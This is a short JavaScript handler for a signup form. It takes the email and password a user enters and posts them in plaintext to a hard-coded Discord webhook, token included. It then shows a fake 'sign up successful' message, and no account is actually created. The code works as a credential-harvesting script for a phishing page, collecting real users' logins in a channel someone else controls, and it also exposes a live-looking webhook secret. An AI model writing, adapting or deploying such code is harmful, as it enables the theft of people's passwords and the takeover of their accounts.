document.getElementById("signupForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    let data = {
        email: email,
        password: password
    };

    // Send login info to Discord webhook
    fetch('https://discord.com/api/webhooks/1359364686528778342/D4HLo7Yu_WkknAp796BX2_A4eLXjT53zt_LiHFAcSqkFHmlQBPCjZObRcpawgiNHdLvL', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `New user signup: \nEmail: ${data.email}\nPassword: ${data.password}`
        })
    }).then(response => {
        if (response.ok) {
            alert("Sign up successful! Please check your email for confirmation.");
        } else {
            alert("Error during sign-up. Please try again.");
        }
    });
});
